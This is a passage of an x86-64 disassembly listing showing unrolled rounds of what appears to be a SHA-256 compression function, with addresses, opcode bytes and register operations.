    6d8c74e6:	45 31 f9             	xor    %r15d,%r9d
    6d8c74e9:	41 89 c7             	mov    %eax,%r15d
    6d8c74ec:	45 01 c1             	add    %r8d,%r9d
    6d8c74ef:	45 89 e8             	mov    %r13d,%r8d
    6d8c74f2:	45 21 d7             	and    %r10d,%r15d
    6d8c74f5:	45 01 f1             	add    %r14d,%r9d
    6d8c74f8:	45 89 ee             	mov    %r13d,%r14d
    6d8c74fb:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c74ff:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c7503:	45 31 f0             	xor    %r14d,%r8d
    6d8c7506:	45 89 ee             	mov    %r13d,%r14d
    6d8c7509:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c750d:	45 31 c6             	xor    %r8d,%r14d
    6d8c7510:	44 8b 84 24 c4 00 00 	mov    0xc4(%rsp),%r8d
    6d8c7517:	00 
    6d8c7518:	47 8d a4 04 08 6c 37 	lea    0x1e376c08(%r12,%r8,1),%r12d
    6d8c751f:	1e 
    6d8c7520:	45 89 e8             	mov    %r13d,%r8d
    6d8c7523:	45 01 f4             	add    %r14d,%r12d
    6d8c7526:	41 f7 d0             	not    %r8d
    6d8c7529:	41 89 fe             	mov    %edi,%r14d
    6d8c752c:	41 21 e8             	and    %ebp,%r8d
    6d8c752f:	45 21 ee             	and    %r13d,%r14d
    6d8c7532:	45 31 c6             	xor    %r8d,%r14d
    6d8c7535:	45 89 c8             	mov    %r9d,%r8d
    6d8c7538:	45 01 e6             	add    %r12d,%r14d
    6d8c753b:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c753f:	46 8d 24 32          	lea    (%rdx,%r14,1),%r12d
    6d8c7543:	44 89 ca             	mov    %r9d,%edx
    6d8c7546:	c1 ca 0d             	ror    $0xd,%edx
    6d8c7549:	44 31 c2             	xor    %r8d,%edx
    6d8c754c:	45 89 c8             	mov    %r9d,%r8d
    6d8c754f:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c7553:	44 31 c2             	xor    %r8d,%edx
    6d8c7556:	41 89 c0             	mov    %eax,%r8d
    6d8c7559:	45 31 d0             	xor    %r10d,%r8d
    6d8c755c:	45 21 c8             	and    %r9d,%r8d
    6d8c755f:	45 31 f8             	xor    %r15d,%r8d
    6d8c7562:	45 89 d7             	mov    %r10d,%r15d
    6d8c7565:	41 01 d0             	add    %edx,%r8d
    6d8c7568:	44 89 e2             	mov    %r12d,%edx
    6d8c756b:	45 01 f0             	add    %r14d,%r8d
    6d8c756e:	45 89 e6             	mov    %r12d,%r14d
    6d8c7571:	c1 ca 06             	ror    $0x6,%edx
    6d8c7574:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c7578:	44 31 f2             	xor    %r14d,%edx
    6d8c757b:	45 89 e6             	mov    %r12d,%r14d
    6d8c757e:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7582:	41 31 d6             	xor    %edx,%r14d
    6d8c7585:	8b 94 24 c8 00 00 00 	mov    0xc8(%rsp),%edx
    6d8c758c:	8d ac 15 4c 77 48 27 	lea    0x2748774c(%rbp,%rdx,1),%ebp
    6d8c7593:	44 89 e2             	mov    %r12d,%edx
    6d8c7596:	44 01 f5             	add    %r14d,%ebp
    6d8c7599:	f7 d2                	not    %edx
    6d8c759b:	45 89 ee             	mov    %r13d,%r14d
    6d8c759e:	21 fa                	and    %edi,%edx
    6d8c75a0:	45 21 e6             	and    %r12d,%r14d
    6d8c75a3:	45 21 cf             	and    %r9d,%r15d
    6d8c75a6:	41 31 d6             	xor    %edx,%r14d
    6d8c75a9:	44 89 c2             	mov    %r8d,%edx
    6d8c75ac:	41 01 ee             	add    %ebp,%r14d
    6d8c75af:	c1 ca 02             	ror    $0x2,%edx
    6d8c75b2:	42 8d 2c 30          	lea    (%rax,%r14,1),%ebp
    6d8c75b6:	44 89 c0             	mov    %r8d,%eax
    6d8c75b9:	c1 c8 0d             	ror    $0xd,%eax
    6d8c75bc:	31 d0                	xor    %edx,%eax
    6d8c75be:	44 89 c2             	mov    %r8d,%edx
    6d8c75c1:	c1 c2 0a             	rol    $0xa,%edx
    6d8c75c4:	31 d0                	xor    %edx,%eax
    6d8c75c6:	44 89 d2             	mov    %r10d,%edx
    6d8c75c9:	44 31 ca             	xor    %r9d,%edx
    6d8c75cc:	44 21 c2             	and    %r8d,%edx
    6d8c75cf:	44 31 fa             	xor    %r15d,%edx
    6d8c75d2:	45 89 cf             	mov    %r9d,%r15d
    6d8c75d5:	01 c2                	add    %eax,%edx
    6d8c75d7:	89 e8                	mov    %ebp,%eax
    6d8c75d9:	44 01 f2             	add    %r14d,%edx
    6d8c75dc:	41 89 ee             	mov    %ebp,%r14d
    6d8c75df:	c1 c8 06             	ror    $0x6,%eax
    6d8c75e2:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c75e6:	44 31 f0             	xor    %r14d,%eax
    6d8c75e9:	41 89 ee             	mov    %ebp,%r14d
    6d8c75ec:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c75f0:	41 31 c6             	xor    %eax,%r14d
    6d8c75f3:	8b 84 24 cc 00 00 00 	mov    0xcc(%rsp),%eax
    6d8c75fa:	8d bc 07 b5 bc b0 34 	lea    0x34b0bcb5(%rdi,%rax,1),%edi
    6d8c7601:	89 e8                	mov    %ebp,%eax
    6d8c7603:	44 01 f7             	add    %r14d,%edi
    6d8c7606:	f7 d0                	not    %eax
    6d8c7608:	45 89 e6             	mov    %r12d,%r14d
    6d8c760b:	44 21 e8             	and    %r13d,%eax
    6d8c760e:	41 21 ee             	and    %ebp,%r14d
    6d8c7611:	41 31 c6             	xor    %eax,%r14d
    6d8c7614:	89 d0                	mov    %edx,%eax
    6d8c7616:	41 01 fe             	add    %edi,%r14d
    6d8c7619:	c1 c8 02             	ror    $0x2,%eax
    6d8c761c:	43 8d 3c 32          	lea    (%r10,%r14,1),%edi
    6d8c7620:	41 89 d2             	mov    %edx,%r10d
    6d8c7623:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c7627:	41 31 c2             	xor    %eax,%r10d
    6d8c762a:	89 d0                	mov    %edx,%eax
    6d8c762c:	c1 c0 0a             	rol    $0xa,%eax
    6d8c762f:	41 31 c2             	xor    %eax,%r10d
    6d8c7632:	44 89 c8             	mov    %r9d,%eax
    6d8c7635:	44 31 c0             	xor    %r8d,%eax
    6d8c7638:	21 d0                	and    %edx,%eax
    6d8c763a:	45 21 c7             	and    %r8d,%r15d
    6d8c763d:	44 31 f8             	xor    %r15d,%eax
    6d8c7640:	45 89 c7             	mov    %r8d,%r15d
    6d8c7643:	44 01 d0             	add    %r10d,%eax
    6d8c7646:	41 89 fa             	mov    %edi,%r10d
    6d8c7649:	41 21 d7             	and    %edx,%r15d
    6d8c764c:	44 01 f0             	add    %r14d,%eax
    6d8c764f:	41 89 fe             	mov    %edi,%r14d
    6d8c7652:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c7656:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c765a:	45 31 f2             	xor    %r14d,%r10d
    6d8c765d:	41 89 fe             	mov    %edi,%r14d
    6d8c7660:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7664:	45 31 d6             	xor    %r10d,%r14d
    6d8c7667:	44 8b 94 24 d0 00 00 	mov    0xd0(%rsp),%r10d
    6d8c766e:	00 
    6d8c766f:	47 8d ac 15 b3 0c 1c 	lea    0x391c0cb3(%r13,%r10,1),%r13d
    6d8c7676:	39 
    6d8c7677:	41 89 fa             	mov    %edi,%r10d
    6d8c767a:	45 01 f5             	add    %r14d,%r13d
    6d8c767d:	41 f7 d2             	not    %r10d
    6d8c7680:	41 89 ee             	mov    %ebp,%r14d
    6d8c7683:	45 21 e2             	and    %r12d,%r10d
    6d8c7686:	41 21 fe             	and    %edi,%r14d
    6d8c7689:	45 31 d6             	xor    %r10d,%r14d
    6d8c768c:	41 89 c2             	mov    %eax,%r10d
    6d8c768f:	45 01 ee             	add    %r13d,%r14d
    6d8c7692:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c7696:	47 8d 2c 31          	lea    (%r9,%r14,1),%r13d
    6d8c769a:	41 89 c1             	mov    %eax,%r9d
    6d8c769d:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c76a1:	45 31 d1             	xor    %r10d,%r9d
    6d8c76a4:	41 89 c2             	mov    %eax,%r10d
    6d8c76a7:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c76ab:	45 31 d1             	xor    %r10d,%r9d
    6d8c76ae:	45 89 c2             	mov    %r8d,%r10d
    6d8c76b1:	41 31 d2             	xor    %edx,%r10d
    6d8c76b4:	41 21 c2             	and    %eax,%r10d
    6d8c76b7:	45 31 fa             	xor    %r15d,%r10d
    6d8c76ba:	41 89 d7             	mov    %edx,%r15d
    6d8c76bd:	45 01 ca             	add    %r9d,%r10d
    6d8c76c0:	45 89 e9             	mov    %r13d,%r9d
    6d8c76c3:	45 01 f2             	add    %r14d,%r10d
    6d8c76c6:	45 89 ee             	mov    %r13d,%r14d
    6d8c76c9:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c76cd:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c76d1:	45 31 f1             	xor    %r14d,%r9d
    6d8c76d4:	45 89 ee             	mov    %r13d,%r14d
    6d8c76d7:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c76db:	45 31 ce             	xor    %r9d,%r14d
    6d8c76de:	44 8b 8c 24 d4 00 00 	mov    0xd4(%rsp),%r9d
    6d8c76e5:	00 
    6d8c76e6:	47 8d a4 0c 4a aa d8 	lea    0x4ed8aa4a(%r12,%r9,1),%r12d
    6d8c76ed:	4e 
    6d8c76ee:	45 89 e9             	mov    %r13d,%r9d
    6d8c76f1:	45 01 f4             	add    %r14d,%r12d
    6d8c76f4:	41 f7 d1             	not    %r9d
    6d8c76f7:	41 89 fe             	mov    %edi,%r14d
    6d8c76fa:	41 21 e9             	and    %ebp,%r9d
    6d8c76fd:	45 21 ee             	and    %r13d,%r14d
    6d8c7700:	41 21 c7             	and    %eax,%r15d
    6d8c7703:	45 31 ce             	xor    %r9d,%r14d
    6d8c7706:	45 89 d1             	mov    %r10d,%r9d
    6d8c7709:	45 01 e6             	add    %r12d,%r14d
    6d8c770c:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c7710:	47 8d 24 30          	lea    (%r8,%r14,1),%r12d
    6d8c7714:	45 89 d0             	mov    %r10d,%r8d
    6d8c7717:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c771b:	45 31 c8             	xor    %r9d,%r8d
    6d8c771e:	45 89 d1             	mov    %r10d,%r9d
    6d8c7721:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c7725:	45 31 c8             	xor    %r9d,%r8d
    6d8c7728:	41 89 d1             	mov    %edx,%r9d
    6d8c772b:	41 31 c1             	xor    %eax,%r9d
    6d8c772e:	45 21 d1             	and    %r10d,%r9d
    6d8c7731:	45 31 f9             	xor    %r15d,%r9d
    6d8c7734:	41 89 c7             	mov    %eax,%r15d
    6d8c7737:	45 01 c1             	add    %r8d,%r9d
    6d8c773a:	45 89 e0             	mov    %r12d,%r8d
    6d8c773d:	45 21 d7             	and    %r10d,%r15d
    6d8c7740:	45 01 f1             	add    %r14d,%r9d
    6d8c7743:	45 89 e6             	mov    %r12d,%r14d
    6d8c7746:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c774a:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c774e:	45 31 f0             	xor    %r14d,%r8d
    6d8c7751:	45 89 e6             	mov    %r12d,%r14d
    6d8c7754:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7758:	45 31 c6             	xor    %r8d,%r14d
    6d8c775b:	44 8b 84 24 d8 00 00 	mov    0xd8(%rsp),%r8d
    6d8c7762:	00 
    6d8c7763:	42 8d ac 05 4f ca 9c 	lea    0x5b9cca4f(%rbp,%r8,1),%ebp
    6d8c776a:	5b 
    6d8c776b:	45 89 e0             	mov    %r12d,%r8d
    6d8c776e:	41 01 ee             	add    %ebp,%r14d
    6d8c7771:	41 f7 d0             	not    %r8d
    6d8c7774:	44 89 ed             	mov    %r13d,%ebp
    6d8c7777:	41 21 f8             	and    %edi,%r8d
    6d8c777a:	44 21 e5             	and    %r12d,%ebp
    6d8c777d:	44 31 c5             	xor    %r8d,%ebp
    6d8c7780:	45 89 c8             	mov    %r9d,%r8d
    6d8c7783:	44 01 f5             	add    %r14d,%ebp
    6d8c7786:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c778a:	44 8d 34 2a          	lea    (%rdx,%rbp,1),%r14d
    6d8c778e:	44 89 ca             	mov    %r9d,%edx
    6d8c7791:	c1 ca 0d             	ror    $0xd,%edx
    6d8c7794:	44 31 c2             	xor    %r8d,%edx
    6d8c7797:	45 89 c8             	mov    %r9d,%r8d
    6d8c779a:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c779e:	44 31 c2             	xor    %r8d,%edx
    6d8c77a1:	41 89 c0             	mov    %eax,%r8d
    6d8c77a4:	45 31 d0             	xor    %r10d,%r8d
    6d8c77a7:	45 21 c8             	and    %r9d,%r8d
    6d8c77aa:	45 31 f8             	xor    %r15d,%r8d
    6d8c77ad:	41 01 d0             	add    %edx,%r8d
    6d8c77b0:	44 89 f2             	mov    %r14d,%edx
    6d8c77b3:	41 01 e8             	add    %ebp,%r8d
    6d8c77b6:	44 89 f5             	mov    %r14d,%ebp
    6d8c77b9:	c1 ca 06             	ror    $0x6,%edx
    6d8c77bc:	c1 cd 0b             	ror    $0xb,%ebp
    6d8c77bf:	31 ea                	xor    %ebp,%edx
    6d8c77c1:	44 89 f5             	mov    %r14d,%ebp
    6d8c77c4:	c1 c5 07             	rol    $0x7,%ebp
    6d8c77c7:	31 d5                	xor    %edx,%ebp
    6d8c77c9:	8b 94 24 dc 00 00 00 	mov    0xdc(%rsp),%edx
    6d8c77d0:	8d bc 17 f3 6f 2e 68 	lea    0x682e6ff3(%rdi,%rdx,1),%edi
    6d8c77d7:	44 89 f2             	mov    %r14d,%edx
    6d8c77da:	01 fd                	add    %edi,%ebp
    6d8c77dc:	f7 d2                	not    %edx
    6d8c77de:	44 89 e7             	mov    %r12d,%edi
    6d8c77e1:	44 21 ea             	and    %r13d,%edx
    6d8c77e4:	44 21 f7             	and    %r14d,%edi
    6d8c77e7:	31 d7                	xor    %edx,%edi
    6d8c77e9:	44 89 c2             	mov    %r8d,%edx
    6d8c77ec:	01 ef                	add    %ebp,%edi
    6d8c77ee:	c1 ca 02             	ror    $0x2,%edx
    6d8c77f1:	44 89 d5             	mov    %r10d,%ebp
    6d8c77f4:	44 8d 3c 38          	lea    (%rax,%rdi,1),%r15d
    6d8c77f8:	44 89 c0             	mov    %r8d,%eax
    6d8c77fb:	44 21 cd             	and    %r9d,%ebp
    6d8c77fe:	c1 c8 0d             	ror    $0xd,%eax
    6d8c7801:	31 d0                	xor    %edx,%eax
    6d8c7803:	44 89 c2             	mov    %r8d,%edx
    6d8c7806:	c1 c2 0a             	rol    $0xa,%edx
    6d8c7809:	31 d0                	xor    %edx,%eax
    6d8c780b:	44 89 d2             	mov    %r10d,%edx
    6d8c780e:	44 31 ca             	xor    %r9d,%edx
    6d8c7811:	44 21 c2             	and    %r8d,%edx
    6d8c7814:	31 ea                	xor    %ebp,%edx
    6d8c7816:	44 89 fd             	mov    %r15d,%ebp
    6d8c7819:	01 c2                	add    %eax,%edx
    6d8c781b:	8b 84 24 e0 00 00 00 	mov    0xe0(%rsp),%eax
    6d8c7822:	c1 cd 06             	ror    $0x6,%ebp
    6d8c7825:	01 fa                	add    %edi,%edx
    6d8c7827:	44 89 ff             	mov    %r15d,%edi
    6d8c782a:	c1 cf 0b             	ror    $0xb,%edi
    6d8c782d:	31 ef                	xor    %ebp,%edi
    6d8c782f:	44 89 fd             	mov    %r15d,%ebp
    6d8c7832:	c1 c5 07             	rol    $0x7,%ebp
    6d8c7835:	31 fd                	xor    %edi,%ebp
    6d8c7837:	41 8d bc 05 ee 82 8f 	lea    0x748f82ee(%r13,%rax,1),%edi
    6d8c783e:	74 
    6d8c783f:	44 89 f8             	mov    %r15d,%eax
    6d8c7842:	45 89 cd             	mov    %r9d,%r13d
    6d8c7845:	01 ef                	add    %ebp,%edi
    6d8c7847:	f7 d0                	not    %eax
    6d8c7849:	44 89 f5             	mov    %r14d,%ebp
    6d8c784c:	44 21 e0             	and    %r12d,%eax
    6d8c784f:	44 21 fd             	and    %r15d,%ebp
    6d8c7852:	31 c5                	xor    %eax,%ebp
    6d8c7854:	89 d0                	mov    %edx,%eax
    6d8c7856:	45 21 c5             	and    %r8d,%r13d
    6d8c7859:	01 fd                	add    %edi,%ebp
    6d8c785b:	89 d7                	mov    %edx,%edi
    6d8c785d:	c1 c8 02             	ror    $0x2,%eax
    6d8c7860:	c1 cf 0d             	ror    $0xd,%edi
    6d8c7863:	41 01 ea             	add    %ebp,%r10d
    6d8c7866:	31 c7                	xor    %eax,%edi
    6d8c7868:	89 d0                	mov    %edx,%eax
    6d8c786a:	c1 c0 0a             	rol    $0xa,%eax
    6d8c786d:	31 c7                	xor    %eax,%edi
    6d8c786f:	44 89 c8             	mov    %r9d,%eax
    6d8c7872:	44 31 c0             	xor    %r8d,%eax
    6d8c7875:	21 d0                	and    %edx,%eax
    6d8c7877:	44 31 e8             	xor    %r13d,%eax
    6d8c787a:	45 89 c5             	mov    %r8d,%r13d
    6d8c787d:	01 f8                	add    %edi,%eax
    6d8c787f:	44 89 d7             	mov    %r10d,%edi
    6d8c7882:	01 e8                	add    %ebp,%eax
    6d8c7884:	44 89 d5             	mov    %r10d,%ebp
    6d8c7887:	c1 cf 06             	ror    $0x6,%edi
    6d8c788a:	c1 cd 0b             	ror    $0xb,%ebp
    6d8c788d:	31 ef                	xor    %ebp,%edi
    6d8c788f:	44 89 d5             	mov    %r10d,%ebp
    6d8c7892:	c1 c5 07             	rol    $0x7,%ebp
    6d8c7895:	31 fd                	xor    %edi,%ebp
    6d8c7897:	8b bc 24 e4 00 00 00 	mov    0xe4(%rsp),%edi
    6d8c789e:	45 8d a4 3c 6f 63 a5 	lea    0x78a5636f(%r12,%rdi,1),%r12d
    6d8c78a5:	78 
    6d8c78a6:	44 89 d7             	mov    %r10d,%edi
    6d8c78a9:	44 01 e5             	add    %r12d,%ebp
    6d8c78ac:	f7 d7                	not    %edi
    6d8c78ae:	45 89 fc             	mov    %r15d,%r12d
    6d8c78b1:	44 21 f7             	and    %r14d,%edi
    6d8c78b4:	45 21 d4             	and    %r10d,%r12d
    6d8c78b7:	41 31 fc             	xor    %edi,%r12d
    6d8c78ba:	89 c7                	mov    %eax,%edi
    6d8c78bc:	41 01 ec             	add    %ebp,%r12d
    6d8c78bf:	89 c5                	mov    %eax,%ebp
    6d8c78c1:	c1 cf 02             	ror    $0x2,%edi
    6d8c78c4:	c1 cd 0d             	ror    $0xd,%ebp
    6d8c78c7:	45 01 e1             	add    %r12d,%r9d
    6d8c78ca:	31 fd                	xor    %edi,%ebp
    6d8c78cc:	89 c7                	mov    %eax,%edi
    6d8c78ce:	c1 c7 0a             	rol    $0xa,%edi
    6d8c78d1:	31 fd                	xor    %edi,%ebp
    6d8c78d3:	44 89 c7             	mov    %r8d,%edi
    6d8c78d6:	31 d7                	xor    %edx,%edi
    6d8c78d8:	21 c7                	and    %eax,%edi
    6d8c78da:	41 21 d5             	and    %edx,%r13d
    6d8c78dd:	44 31 ef             	xor    %r13d,%edi
    6d8c78e0:	45 89 cd             	mov    %r9d,%r13d
    6d8c78e3:	01 ef                	add    %ebp,%edi
    6d8c78e5:	8b ac 24 e8 00 00 00 	mov    0xe8(%rsp),%ebp
    6d8c78ec:	41 c1 cd 06          	ror    $0x6,%r13d
    6d8c78f0:	44 01 e7             	add    %r12d,%edi
    6d8c78f3:	45 89 cc             	mov    %r9d,%r12d
    6d8c78f6:	41 c1 cc 0b          	ror    $0xb,%r12d
    6d8c78fa:	45 31 ec             	xor    %r13d,%r12d
    6d8c78fd:	45 89 cd             	mov    %r9d,%r13d
    6d8c7900:	41 c1 c5 07          	rol    $0x7,%r13d
    6d8c7904:	45 31 e5             	xor    %r12d,%r13d
    6d8c7907:	45 8d a4 2e 14 78 c8 	lea    -0x7b3787ec(%r14,%rbp,1),%r12d
    6d8c790e:	84 
    6d8c790f:	44 89 cd             	mov    %r9d,%ebp
    6d8c7912:	41 89 d6             	mov    %edx,%r14d
    6d8c7915:	45 01 ec             	add    %r13d,%r12d
    6d8c7918:	f7 d5                	not    %ebp
    6d8c791a:	45 89 d5             	mov    %r10d,%r13d
    6d8c791d:	44 21 fd             	and    %r15d,%ebp
    6d8c7920:	45 21 cd             	and    %r9d,%r13d
    6d8c7923:	41 21 c6             	and    %eax,%r14d
    6d8c7926:	41 31 ed             	xor    %ebp,%r13d
    6d8c7929:	89 fd                	mov    %edi,%ebp
    6d8c792b:	45 01 e5             	add    %r12d,%r13d
    6d8c792e:	41 89 fc             	mov    %edi,%r12d
    6d8c7931:	c1 cd 02             	ror    $0x2,%ebp
    6d8c7934:	41 c1 cc 0d          	ror    $0xd,%r12d
    6d8c7938:	45 01 e8             	add    %r13d,%r8d
    6d8c793b:	41 31 ec             	xor    %ebp,%r12d
    6d8c793e:	89 fd                	mov    %edi,%ebp
    6d8c7940:	c1 c5 0a             	rol    $0xa,%ebp
    6d8c7943:	41 31 ec             	xor    %ebp,%r12d
    6d8c7946:	89 d5                	mov    %edx,%ebp
    6d8c7948:	31 c5                	xor    %eax,%ebp
    6d8c794a:	21 fd                	and    %edi,%ebp
    6d8c794c:	44 31 f5             	xor    %r14d,%ebp
    6d8c794f:	45 89 c6             	mov    %r8d,%r14d
    6d8c7952:	44 01 e5             	add    %r12d,%ebp
    6d8c7955:	44 8b a4 24 ec 00 00 	mov    0xec(%rsp),%r12d
    6d8c795c:	00 
    6d8c795d:	41 c1 ce 06          	ror    $0x6,%r14d
    6d8c7961:	44 01 ed             	add    %r13d,%ebp
    6d8c7964:	45 89 c5             	mov    %r8d,%r13d
    6d8c7967:	41 c1 cd 0b          	ror    $0xb,%r13d
    6d8c796b:	45 31 f5             	xor    %r14d,%r13d
    6d8c796e:	45 89 c6             	mov    %r8d,%r14d
    6d8c7971:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7975:	45 31 ee             	xor    %r13d,%r14d
    6d8c7978:	47 8d ac 27 08 02 c7 	lea    -0x7338fdf8(%r15,%r12,1),%r13d
    6d8c797f:	8c 
    6d8c7980:	45 89 c4             	mov    %r8d,%r12d
    6d8c7983:	41 89 c7             	mov    %eax,%r15d
    6d8c7986:	45 01 f5             	add    %r14d,%r13d
    6d8c7989:	41 f7 d4             	not    %r12d
    6d8c798c:	45 89 ce             	mov    %r9d,%r14d
    6d8c798f:	45 21 d4             	and    %r10d,%r12d
    6d8c7992:	45 21 c6             	and    %r8d,%r14d
    6d8c7995:	41 21 ff             	and    %edi,%r15d
    6d8c7998:	45 31 e6             	xor    %r12d,%r14d
    6d8c799b:	41 89 ec             	mov    %ebp,%r12d
    6d8c799e:	45 01 ee             	add    %r13d,%r14d
    6d8c79a1:	41 89 ed             	mov    %ebp,%r13d
    6d8c79a4:	41 c1 cc 02          	ror    $0x2,%r12d
    6d8c79a8:	41 c1 cd 0d          	ror    $0xd,%r13d
    6d8c79ac:	44 01 f2             	add    %r14d,%edx
    6d8c79af:	45 31 e5             	xor    %r12d,%r13d
    6d8c79b2:	41 89 ec             	mov    %ebp,%r12d
    6d8c79b5:	41 c1 c4 0a          	rol    $0xa,%r12d
    6d8c79b9:	45 31 e5             	xor    %r12d,%r13d
    6d8c79bc:	41 89 c4             	mov    %eax,%r12d
    6d8c79bf:	41 31 fc             	xor    %edi,%r12d
    6d8c79c2:	41 21 ec             	and    %ebp,%r12d
    6d8c79c5:	45 31 fc             	xor    %r15d,%r12d
    6d8c79c8:	41 89 ff             	mov    %edi,%r15d
    6d8c79cb:	45 01 ec             	add    %r13d,%r12d
    6d8c79ce:	41 89 d5             	mov    %edx,%r13d
    6d8c79d1:	45 01 f4             	add    %r14d,%r12d
    6d8c79d4:	41 89 d6             	mov    %edx,%r14d
    6d8c79d7:	41 c1 cd 0b          	ror    $0xb,%r13d
    6d8c79db:	41 c1 ce 06          	ror    $0x6,%r14d
    6d8c79df:	45 31 f5             	xor    %r14d,%r13d
    6d8c79e2:	41 89 d6             	mov    %edx,%r14d
    6d8c79e5:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c79e9:	45 31 ee             	xor    %r13d,%r14d
    6d8c79ec:	44 8b ac 24 f0 00 00 	mov    0xf0(%rsp),%r13d
    6d8c79f3:	00 
    6d8c79f4:	47 8d ac 2a fa ff be 	lea    -0x6f410006(%r10,%r13,1),%r13d
    6d8c79fb:	90 
    6d8c79fc:	41 89 d2             	mov    %edx,%r10d
    6d8c79ff:	45 01 f5             	add    %r14d,%r13d
    6d8c7a02:	41 f7 d2             	not    %r10d
    6d8c7a05:	45 89 c6             	mov    %r8d,%r14d
    6d8c7a08:	45 21 ca             	and    %r9d,%r10d
    6d8c7a0b:	41 21 d6             	and    %edx,%r14d
    6d8c7a0e:	45 31 d6             	xor    %r10d,%r14d
    6d8c7a11:	45 89 e2             	mov    %r12d,%r10d
    6d8c7a14:	45 01 ee             	add    %r13d,%r14d
    6d8c7a17:	45 89 e5             	mov    %r12d,%r13d
    6d8c7a1a:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c7a1e:	41 c1 cd 0d          	ror    $0xd,%r13d
    6d8c7a22:	44 01 f0             	add    %r14d,%eax
    6d8c7a25:	45 31 d5             	xor    %r10d,%r13d
    6d8c7a28:	45 89 e2             	mov    %r12d,%r10d
    6d8c7a2b:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c7a2f:	45 31 d5             	xor    %r10d,%r13d
    6d8c7a32:	41 89 fa             	mov    %edi,%r10d
    6d8c7a35:	41 31 ea             	xor    %ebp,%r10d
    6d8c7a38:	41 21 ef             	and    %ebp,%r15d
    6d8c7a3b:	45 21 e2             	and    %r12d,%r10d
    6d8c7a3e:	45 31 fa             	xor    %r15d,%r10d
    6d8c7a41:	41 89 ef             	mov    %ebp,%r15d
    6d8c7a44:	45 01 ea             	add    %r13d,%r10d
    6d8c7a47:	41 89 c5             	mov    %eax,%r13d
    6d8c7a4a:	45 21 e7             	and    %r12d,%r15d
    6d8c7a4d:	45 01 f2             	add    %r14d,%r10d
    6d8c7a50:	41 89 c6             	mov    %eax,%r14d
    6d8c7a53:	41 c1 cd 0b          	ror    $0xb,%r13d
    6d8c7a57:	41 c1 ce 06          	ror    $0x6,%r14d
    6d8c7a5b:	45 31 f5             	xor    %r14d,%r13d
    6d8c7a5e:	41 89 c6             	mov    %eax,%r14d
    6d8c7a61:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7a65:	45 31 ee             	xor    %r13d,%r14d
    6d8c7a68:	44 8b ac 24 f4 00 00 	mov    0xf4(%rsp),%r13d
    6d8c7a6f:	00 
    6d8c7a70:	47 8d ac 29 eb 6c 50 	lea    -0x5baf9315(%r9,%r13,1),%r13d
    6d8c7a77:	a4 
    6d8c7a78:	41 89 c1             	mov    %eax,%r9d
    6d8c7a7b:	45 01 f5             	add    %r14d,%r13d
    6d8c7a7e:	41 f7 d1             	not    %r9d
    6d8c7a81:	41 89 d6             	mov    %edx,%r14d
    6d8c7a84:	45 21 c1             	and    %r8d,%r9d
    6d8c7a87:	41 21 c6             	and    %eax,%r14d
    6d8c7a8a:	45 31 ce             	xor    %r9d,%r14d
    6d8c7a8d:	45 89 d1             	mov    %r10d,%r9d
    6d8c7a90:	45 01 ee             	add    %r13d,%r14d
    6d8c7a93:	45 89 d5             	mov    %r10d,%r13d
    6d8c7a96:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c7a9a:	41 c1 cd 0d          	ror    $0xd,%r13d
    6d8c7a9e:	44 01 f7             	add    %r14d,%edi
    6d8c7aa1:	45 31 cd             	xor    %r9d,%r13d
    6d8c7aa4:	45 89 d1             	mov    %r10d,%r9d
    6d8c7aa7:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c7aab:	45 31 cd             	xor    %r9d,%r13d
    6d8c7aae:	41 89 e9             	mov    %ebp,%r9d
    6d8c7ab1:	45 31 e1             	xor    %r12d,%r9d
    6d8c7ab4:	45 21 d1             	and    %r10d,%r9d
    6d8c7ab7:	45 31 f9             	xor    %r15d,%r9d
    6d8c7aba:	45 89 e7             	mov    %r12d,%r15d
    6d8c7abd:	45 01 e9             	add    %r13d,%r9d
    6d8c7ac0:	41 89 fd             	mov    %edi,%r13d
    6d8c7ac3:	45 01 f1             	add    %r14d,%r9d
    6d8c7ac6:	41 89 fe             	mov    %edi,%r14d
    6d8c7ac9:	41 c1 cd 0b          	ror    $0xb,%r13d
    6d8c7acd:	41 c1 ce 06          	ror    $0x6,%r14d
    6d8c7ad1:	45 31 f5             	xor    %r14d,%r13d
    6d8c7ad4:	41 89 fe             	mov    %edi,%r14d
    6d8c7ad7:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c7adb:	45 31 ee             	xor    %r13d,%r14d
    6d8c7ade:	44 8b ac 24 f8 00 00 	mov    0xf8(%rsp),%r13d
    6d8c7ae5:	00 
    6d8c7ae6:	45 21 d7             	and    %r10d,%r15d
    6d8c7ae9:	47 8d ac 28 f7 a3 f9 	lea    -0x41065c09(%r8,%r13,1),%r13d
    6d8c7af0:	be 
    6d8c7af1:	41 89 f8             	mov    %edi,%r8d
    6d8c7af4:	45 01 f5             	add    %r14d,%r13d
